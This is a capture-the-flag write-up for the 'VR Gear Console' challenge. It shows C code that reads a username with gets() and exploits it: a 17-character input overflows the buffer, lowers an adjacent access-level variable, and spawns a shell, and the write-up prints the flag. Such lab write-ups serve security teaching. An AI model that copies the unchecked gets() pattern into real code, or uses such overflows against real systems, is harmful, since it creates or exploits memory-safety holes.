### VR Gear Console - 90 points

> Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/1e50bd93be07ea1bca65a1a071e18eef

Hint:
> * What happens if you read in more characters than the length of the username buffer?
> * You should look at an ascii table to see what character you need to choose.
> * Numbers are stored in little-endian format, which means that the lowest byte of the number is first.
> * "cat file - | vrgearconsole " will keep the pipe open for commands.

The hint tells us that we want to overflow the username.
Let's look at the code.
```c
int login() {
	int accessLevel = 0xff;
	char username[16];
	char password[32];
	printf("Username (max 15 characters): ");
	gets(username);
	printf("Password (max 31 characters): ");
	gets(password);
	...
	if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
		accessLevel = 2;                                                                           
	} else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {
		accessLevel = 0;                                                                           
	} else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
		accessLevel = 0x80;
	}                                                                                               
	
	return accessLevel;
}
...
int main(int argc, char **argv) {
    ...
	int access = login();
    printf("Your access level is: 0x%08x\n", access);
    if (access >= 0xff || access <= 0) {
    	printf("Login unsuccessful.\n");
    	exit(10);
    } else if (access < 0x30) {
    	printf("Admin access granted!\n");
    	printf("The flag is in \"flag.txt\".\n");
    	system("/bin/sh");
    } else {
    	printf("Login successful.\n");
    	printf("You do not have permission to access this resource.\n");
   		exit(1);
   	}
}
```
By looking at the code we understand that we want our access to be lower than 0x30.
This access is calculated using login() which gets our input (without verifying the length) and does a few comparisons, therefore we can overflow it (just like the hint says).

Let's see how the the program responds to our inputs (username buffer can have 16 characters).
```
Username (max 15 characters):                                                                      
Password (max 31 characters):                                                                      
Your access level is: 0x000000ff                                                                   
Login unsuccessful.
```
Ok, let's try give it 17 characters to the username.
```
Username (max 15 characters): AAAAAAAAAAAAAAAAA
Password (max 31 characters):  
Your access level is: 0x00000041
Login successful.
You do not have permission to access this resource.
```
We're getting closer. It appears the last character is being written to the last byte of our access level. Let's confirm it!
```
Username (max 15 characters): AAAAAAAAAAAAAAAAB                                                    
Password (max 31 characters):                                                                      
Your access level is: 0x00000042                                                                   
Login successful.                                                                                  
You do not have permission to access this resource. 
```
Our assumption was correct (thank you little-endian). Now we just need it to be less than 30. Let's write an ascii character with a lower hex value ('/' with a value of 2F, for instance).
```
Username (max 15 characters): AAAAAAAAAAAAAAAA/                                                    
Password (max 31 characters):                                                                      
Your access level is: 0x0000002f                                                                   
Admin access granted!                                                                              
The flag is in "flag.txt".                                                                         
$
```
This gave us a shell. Now we can just read the flag.
```
$ ls                                                                                               
flag.txt  vrgearconsole  vrgearconsole.c                                                           
$ cat flag.txt                                                                                     
5a9aeea545615089851dd6a9b57a3139
```
Flag:
```
5a9aeea545615089851dd6a9b57a3139
```